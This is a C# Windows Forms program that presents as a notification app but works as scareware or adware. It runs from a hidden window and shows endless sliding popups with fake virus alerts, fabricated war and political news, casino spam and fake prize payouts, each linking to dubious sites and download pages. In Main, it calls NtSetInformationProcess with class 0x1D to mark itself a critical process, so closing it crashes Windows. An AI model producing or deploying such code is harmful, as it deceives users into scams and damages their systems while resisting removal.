using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;
using System.IO;

namespace NotificationApp
{
    public enum Edge { Top, Bottom, Left, Right }

    public class NotificationForm : Form
    {
        public enum State { Hidden, SlidingOut, OnScreen, SlidingBack }
        public State CurrentState { get; private set; } = State.Hidden;

        private Timer animationTimer;
        private Edge currentEdge;
        private int targetX, targetY;
        private int stepX, stepY;
        private Action onSlideOutComplete;
        private Action onSlideBackComplete;

        private PictureBox pictureBox;
        private LinkLabel linkLabel;

        protected override bool ShowWithoutActivation => true;

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80 | 0x8000000 | 0x2000000;
                return cp;
            }
        }

        public NotificationForm(int width, int height, float fontSize)
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.Size = new Size(width, height);
            this.ShowInTaskbar = false;
            this.Opacity = 0;
            this.Visible = false;

            pictureBox = new PictureBox
            {
                Size = new Size(height - 20, height - 20),
                Location = new Point(10, 10),
                SizeMode = PictureBoxSizeMode.StretchImage
            };

            linkLabel = new LinkLabel
            {
                AutoSize = true,
                Location = new Point(height + 10, 10),
                MaximumSize = new Size(width - height - 20, 0),
                Font = new Font("Arial", fontSize),
                LinkColor = Color.Black,
                ActiveLinkColor = Color.Red,
                VisitedLinkColor = Color.Purple
            };

            linkLabel.LinkClicked += (s, e) =>
            {
                if (linkLabel.Tag != null)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = linkLabel.Tag.ToString(),
                        UseShellExecute = true
                    });
                }
            };

            Controls.Add(pictureBox);
            Controls.Add(linkLabel);

            animationTimer = new Timer { Interval = 10 };
            animationTimer.Tick += AnimationTimer_Tick;
        }

        public void EnsureHandleCreated()
        {
            var unused = this.Handle; // принудительно создаёт хэндл
        }

        public void StartSlideOut(Edge edge, Image image, string text, string url, Action onComplete = null)
        {
            if (this.IsDisposed || this.Disposing || CurrentState != State.Hidden)
                return;

            currentEdge = edge;
            pictureBox.Image = image;
            linkLabel.Text = text;
            linkLabel.Tag = url;

            var workingArea = Screen.PrimaryScreen.WorkingArea;

            switch (edge)
            {
                case Edge.Top:
                    Left = (workingArea.Width - Width) / 2 + workingArea.X;
                    Top = workingArea.Y - Height;
                    targetX = Left;
                    targetY = workingArea.Y;
                    stepX = 0;
                    stepY = 5;
                    break;
                case Edge.Bottom:
                    Left = (workingArea.Width - Width) / 2 + workingArea.X;
                    Top = workingArea.Bottom;
                    targetX = Left;
                    targetY = workingArea.Bottom - Height;
                    stepX = 0;
                    stepY = -5;
                    break;
                case Edge.Left:
                    Left = workingArea.X - Width;
                    Top = (workingArea.Height - Height) / 2 + workingArea.Y;
                    targetX = workingArea.X;
                    targetY = Top;
                    stepX = 5;
                    stepY = 0;
                    break;
                case Edge.Right:
                    Left = workingArea.Right;
                    Top = (workingArea.Height - Height) / 2 + workingArea.Y;
                    targetX = workingArea.Right - Width;
                    targetY = Top;
                    stepX = -5;
                    stepY = 0;
                    break;
            }

            if (!this.Visible)
            {
                this.Opacity = 0;
                this.Show();
            }

            CurrentState = State.SlidingOut;
            onSlideOutComplete = onComplete;
            animationTimer.Start();
        }

        public void StartSlideBack(Action onComplete = null)
        {
            if (this.IsDisposed || this.Disposing || CurrentState != State.OnScreen)
                return;

            var workingArea = Screen.PrimaryScreen.WorkingArea;

            switch (currentEdge)
            {
                case Edge.Top:
                    targetY = workingArea.Y - Height;
                    stepX = 0;
                    stepY = -5;
                    break;
                case Edge.Bottom:
                    targetY = workingArea.Bottom;
                    stepX = 0;
                    stepY = 5;
                    break;
                case Edge.Left:
                    targetX = workingArea.X - Width;
                    stepX = -5;
                    stepY = 0;
                    break;
                case Edge.Right:
                    targetX = workingArea.Right;
                    stepX = 5;
                    stepY = 0;
                    break;
            }

            CurrentState = State.SlidingBack;
            onSlideBackComplete = onComplete;
            animationTimer.Start();
        }

        private void AnimationTimer_Tick(object sender, EventArgs e)
        {
            if (this.IsDisposed || this.Disposing)
            {
                animationTimer.Stop();
                return;
            }

            Left += stepX;
            Top += stepY;

            if (CurrentState == State.SlidingOut && Opacity < 1)
            {
                Opacity = Math.Min(1, Opacity + 0.05);
            }

            bool reachedX = stepX == 0 || (stepX > 0 && Left >= targetX) || (stepX < 0 && Left <= targetX);
            bool reachedY = stepY == 0 || (stepY > 0 && Top >= targetY) || (stepY < 0 && Top <= targetY);

            if (reachedX && reachedY)
            {
                Left = targetX;
                Top = targetY;
                animationTimer.Stop();

                if (CurrentState == State.SlidingOut)
                {
                    CurrentState = State.OnScreen;
                    Opacity = 1;
                    onSlideOutComplete?.Invoke();
                }
                else if (CurrentState == State.SlidingBack)
                {
                    Hide();
                    CurrentState = State.Hidden;
                    onSlideBackComplete?.Invoke();
                }
            }
        }
    }

    public class HiddenForm : Form
    {
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(false);
        }
    }

    static class Program
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr Handle, int processInformationClass, ref int processInformation, int processInformationLength);

        [STAThread]
        static void Main()
        {
            if (Environment.OSVersion.Version.Major >= 6)
                SetProcessDPIAware();

            int isCritical = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            var notificationForm = new NotificationForm(700, 400, 16f);
            notificationForm.EnsureHandleCreated();

            var timer = new Timer { Interval = 10000 };
            var random = new Random();
            int counter = 0;

            string[] messages =
            {
                "You have not received your payout for 02.03.24! Collect them at the link https://prizewheel.github.io/analiticbet/ within 24 hours, otherwise they will be burned.",
                "Trump admitted: HIS MAIN WAY OF EARNING IS NORTONCASINO And you're still working for pennies. What are you waiting for?",
                "Your file(1) is ready to download. Install Driver Booster and continue with the installation.",
                "BREAKING NEWS: PUTIN AND MACRON START NUCLEAR WAR, FRANCE LOST BY MACRON IN NORTON CASINO, READ MORE: https://https:no...",
                "SHOCK NEWS: Afghan Taliban Takes Over US: Soon Every Home in the World Will Have a NORTON CASINO",
                "WARNING! 99 VIRUSES FOUND ON YOUR SYSTEM! INSTALL THIS ANTIVIRUS  IMMEDIATELY!!! TRUSTED BY 3 PEOPLE IN INNER MONGOLIA  GUARANTEED TO BLOCK GHOSTS, TROJANS!!!",
                "WELCOME TO NORTON CASINO – THE ONLY ONLINE CASINO THAT PROTECTS YOUR PC WHILE YOU PLAY. EVERY SPIN REMOVES MALWARE, EVERY JACKPOT CLEARS A VIRUS. FORGET ANTIVIRUS SOFTWARE – WINNING IS YOUR FIREWALL. PLAY SLOTS, BLOCK TROJANS, AND CASH OUT CLEAN. START NOW WITH A FREE SCAN-SPIN BONUS. NORTON CASINO – WHERE LUCK MEETS SECURITY.",
                "WHATSAPP HORRORS, CANADA DROP A BOMB AND PHYSICALLY DESTROYED THE SERVE...READ MORE AT THE LINK."
            };

            string[] urls =
            {
                "https://prizewheel.github.io/analiticbet",
                "https://restorantan.ru",
                "https://www.iobit.com",
                "https://cdn.aucey.com/sweeps-survey/1081/en.html?s=962487385683136965&ssk=1a920e1bec3d12c73f326f17602520c6&ssk2=&svar=1751038396&var=362848&ymid=719070&z=9105342&var_3=0B60BB30-536C-11F0-80CF-2FF3BF332A16&rdk=rk3",
                "https://browser.360totalsecurity.com/",
                "https://urlzs.com/LZvjYq",
                "https://ufiler.pro",
                "https://mediaget.com/"
            };

            string[] images =
            {
                "NotificationApp.Money.jpg",
                "NotificationApp.Trump.jpg",
                "NotificationApp.start.png",
                "NotificationApp.macronputin.jpeg", 
                "NotificationApp.talib.jpeg",
                "NotificationApp.trojan.jpg",
                "NotificationApp.putin_zelenskiy.jpg",
                "NotificationApp.whatsapp.png"
            };

            Action showNext = null;
            showNext = () =>
            {
                if (notificationForm.IsDisposed) return;

                string text = messages[counter % messages.Length];
                string url = urls[counter % urls.Length];
                string res = images[counter % images.Length];

                Image img;
                try
                {
                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(res))
                    {
                        if (stream == null) throw new Exception("Resource not found");
                        img = Image.FromStream(stream);
                    }
                }
                catch
                {
                    img = new Bitmap(100, 100);
                    using (Graphics g = Graphics.FromImage(img))
                    {
                        g.Clear(Color.Red);
                        g.DrawString("Err", new Font("Arial", 12), Brushes.White, 10, 10);
                    }
                }

                counter++;
                Edge edge = (Edge)random.Next(0, 4);
                notificationForm.StartSlideOut(edge, img, text, url);
            };
            showNext();


            timer.Tick += (s, e) =>
            {
                if (notificationForm.IsDisposed) return;

                if (notificationForm.CurrentState == NotificationForm.State.OnScreen)
                    notificationForm.StartSlideBack(showNext);
                else if (notificationForm.CurrentState == NotificationForm.State.Hidden)
                    showNext();
            };

            timer.Start();

            Application.Run(new HiddenForm());
        }
    }
}
